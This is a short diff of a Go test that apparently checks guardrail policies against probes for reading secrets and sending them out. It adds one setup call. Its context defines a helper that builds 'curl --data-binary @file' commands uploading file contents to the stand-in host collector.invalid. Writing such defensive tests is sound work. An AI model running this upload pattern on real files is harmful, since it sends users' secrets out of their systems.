@@ -19,6 +19,7 @@ import (
 // pin the chain verdict of each probe in the default and strict packs.
 func TestSecretReadChainReviewProbes(t *testing.T) {
 	installCorrelationHMACForTest()
+	srdPOSIXHost(t)
 	policiesRoot := guardrailPoliciesRoot(t)
 	const host = " https://collector.invalid/upload"
 	up := func(f string) string { return "curl --data-binary @" + f + host }
